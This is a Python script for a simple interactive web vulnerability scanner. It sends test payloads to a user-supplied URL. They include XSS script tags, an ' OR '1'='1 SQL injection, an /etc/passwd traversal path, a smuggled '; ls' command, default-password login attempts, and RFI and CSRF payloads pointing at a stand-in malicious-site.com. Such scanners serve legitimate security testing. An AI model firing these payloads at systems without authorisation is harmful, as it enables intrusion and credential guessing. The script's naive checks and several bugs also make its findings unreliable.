asimport requests

class VulnerabilityScanner:
    def __init__(self):
        self.target_url = ""
        self.vulnerabilities = []

    def set_target_url(self):
        self.target_url = input("Enter the URL to scan for vulnerabilities: ")

    def scan(self):
        while True:
            self.display_menu()
            choice = input("Enter your choice (1-9): ")
            if choice == "1":
                self.scan_xss()
            elif choice == "2":
                self.scan_sql_injection()
            elif choice == "3":
                self.scan_directory_traversal()
            elif choice == "4":
                self.scan_command_injection()
            elif choice == "5":
                self.scan_server_misconfiguration()
            elif choice == "6":
                self.scan_weak_passwords()
            elif choice == "7":
                self.scan_network_vulnerabilities()
            elif choice == "8":
                self.scan_web_application_security()
            elif choice == "9":
                break
            else:
                print("Invalid choice. Please try again.")

    def display_menu(self):
        print("\nVulnerability Scanner Menu")
        print("1. Cross-Site Scripting (XSS)")
        print("2. SQL Injection")
        print("3. Directory Traversal")
        print("4. Command Injection")
        print("5. Server Misconfiguration")
        print("6. Weak Passwords")
        print("7. Network Vulnerabilities")
        print("8. Web Application Security")
        print("9. Exit")

    def scan_xss(self):
        while True:
            self.display_xss_submenu()
            choice = input("Enter your choice (1-2): ")
            if choice == "1":
                self.check_xss_stored()
            elif choice == "2":
                self.check_xss_reflected()
            elif choice == "3":
                break
            else:
                print("Invalid choice. Please try again.")

    def display_xss_submenu(self):
        print("\nXSS Submenu")
        print("1. Stored XSS")
        print("2. Reflected XSS")
        print("3. Go back")

    def check_xss_stored(self):
        self.set_target_url()
        payload = "<script>alert('Stored XSS')</script>"
        response = requests.post(self.target_url, data={"comment": payload})
        if payload in response.text:
            self.vulnerabilities.append("Stored XSS vulnerability found")

    def check_xss_reflected(self):
        self.set_target_url()
        payload = "<script>alert('Reflected XSS')</script>"
        response = requests.get(self.target_url + "?message=" + payload)
        if payload in response.text:
            self.vulnerabilities.append("Reflected XSS vulnerability found")

    def scan_sql_injection(self):
        while True:
            self.display_sql_injection_submenu()
            choice = input("Enter your choice (1-2): ")
            if choice == "1":
                self.check_sql_injection_get()
            elif choice == "2":
                self.check_sql_injection_post()
            elif choice == "3":
                break
            else:
                print("Invalid choice. Please try again.")

    def display_sql_injection_submenu(self):
        print("\nSQL Injection Submenu")
        print("1. SQL Injection in GET parameters")
        print("2. SQL Injection in POST parameters")
        print("3. Go back")

    def check_sql_injection_get(self):
        self.set_target_url()
        payload = "' OR '1'='1"
        response = requests.get(self.target_url + "?id=" + payload)
        if "error" in response.text:
            self.vulnerabilities.append("SQL injection vulnerability found (GET)")

    def check_sql_injection_post(self):
        self.set_target_url()
        payload = "' OR '1'='1"
        response = requests.post(self.target_url, data={"id": payload})
        if "error" in response.text:
            self.vulnerabilities.append("SQL injection vulnerability found (POST)")

    def scan_directory_traversal(self):
        self.set_target_url()
        payload = "../../../../etc/passwd"
        response = requests.get(self.target_url + payload)
        if "root:x" in response.text:
            self.vulnerabilities.append("Directory traversal vulnerability found")

    def scan_command_injection(self):
        self.set_target_url()
        payload = "127.0.0.1; ls"
        response = requests.get(self.target_url + "?ip=" + payload)
        if "index.html" in response.text:
            self.vulnerabilities.append("Command injection vulnerability found")

    def scan_server_misconfiguration(self):
        self.set_target_url()
        response = requests.get(self.target_url + "/admin")
        if response.status_code == 200:
            self.vulnerabilities.append("Server misconfiguration vulnerability found")

    def scan_weak_passwords(self):
        self.set_target_url()
        usernames = ["admin", "root"]
        passwords = ["admin", "password", "123456"]
        for username in usernames:
            for password in passwords:
                response = requests.post(self.target_url + "/login", data={"username": username, "password": password})
                if "Login successful" in response.text:
                    self.vulnerabilities.append("Weak password vulnerability found")

    def scan_network_vulnerabilities(self):
        while True:
            self.display_network_vulnerabilities_submenu()
            choice = input("Enter your choice (1-3): ")
            if choice == "1":
                self.check_open_ports()
            elif choice == "2":
                self.check_insecure_cookies()
            elif choice == "3":
                break
            else:
                print("Invalid choice. Please try again.")

    def display_network_vulnerabilities_submenu(self):
        print("\nNetwork Vulnerabilities Submenu")
        print("1. Open Ports")
        print("2. Insecure Cookies")
        print("3. Go back")

    def check_open_ports(self):
        self.set_target_url()
        open_ports = []
        for port in range(1, 100):
            try:
                response = requests.get(f"http://{self.target_url}:{port}", timeout=0.5)
                open_ports.append(port)
            except requests.exceptions.RequestException:
                pass
        if open_ports:
            self.vulnerabilities.append(f"Open ports found: {open_ports}")

    def check_insecure_cookies(self):
        self.set_target_url()
        session = requests.Session()
        response = session.get(self.target_url)
        cookies = session.cookies
        for cookie in cookies:
            if not cookie.secure:
                self.vulnerabilities.append("Insecure cookie vulnerability found")

    def scan_web_application_security(self):
        while True:
            self.display_web_application_security_submenu()
            choice = input("Enter your choice (1-3): ")
            if choice == "1":
                self.check_cross_site_request_forgery()
            elif choice == "2":
                self.check_remote_file_inclusion()
            elif choice == "3":
                break
            else:
                print("Invalid choice. Please try again.")

    def display_web_application_security_submenu(self):
        print("\nWeb Application Security Submenu")
        print("1. Cross-Site Request Forgery (CSRF)")
        print("2. Remote File Inclusion (RFI)")
        print("3. Go back")

    def check_cross_site_request_forgery(self):
        self.set_target_url()
        payload = "<img src='http://malicious-site.com/transfer?amount=1000'>"
        response = requests.post(self.target_url, data={"name": "John", "comment": payload})
        if "Transfer successful" in response.text:
            self.vulnerabilities.append("Cross-Site Request Forgery (CSRF) vulnerability found")

    def check_remote_file_inclusion(self):
        self.set_target_url()
        payload = "http://malicious-site.com/malicious-script.php"
        response = requests.get(self.target_url + "?file=" + payload)
        if "Sensitive information leaked" in response.text:
            self.vulnerabilities.append("Remote File Inclusion (RFI) vulnerability found")

    def report_vulnerabilities(self):
        if self.vulnerabilities:
            print("\nVulnerabilities found:")
            for vulnerability in self.vulnerabilities:
                print("- " + vulnerability)
        else:
            print("\nNo vulnerabilities found")



scanner = VulnerabilityScanner()
scanner.scan()
scanner.report_vulnerabilities()
